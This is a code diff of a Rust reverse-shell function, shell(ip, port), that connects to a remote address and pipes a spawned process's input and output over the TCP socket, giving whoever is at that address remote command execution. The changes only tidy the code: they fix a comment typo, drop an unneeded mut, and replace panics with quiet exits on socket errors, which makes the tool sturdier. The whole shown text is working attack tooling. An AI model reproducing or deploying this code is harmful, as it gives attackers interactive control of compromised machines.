@@ -17,14 +17,14 @@ pub fn shell(ip: String, port: String){
 
     let stdin: File = p.stdin.take().unwrap().into();
     let stdout_err: File = p.stdout.take().unwrap().into();
-    let mut stream = TcpStream::connect(socket).unwrap();
+    let stream = TcpStream::connect(socket).unwrap();
 
-    // continiously copy stdin to stream
+    // continuously copy stdin to stream
     let t1 = pipe_thread(stdout_err, stream.try_clone().unwrap());
-    // continiously copy stream output to stdout_err
+    // continuously copy stream output to stdout_err
     let t2 = pipe_thread(stream, stdin);
-    t1.join();
-    t2.join();
+    let _ = t1.join();
+    let _ = t2.join();
    
 }
 
@@ -35,11 +35,17 @@ where R: std::io::Read + Send + 'static,
     std::thread::spawn(move || {
         let mut buffer = [0; 1024];
         loop {
-            let len = r.read(&mut buffer).unwrap();
+            let len = match r.read(&mut buffer){
+                Ok(len) => len,
+                Err(_) => std::process::exit(0),
+            };
             if len == 0 {
                 break;
             }
-            w.write(&buffer[..len]).unwrap();
+            match w.write(&buffer[..len]){
+                Ok(_) => (),
+                Err(_) => std::process::exit(0),
+            };
             w.flush().unwrap();
         }
     })
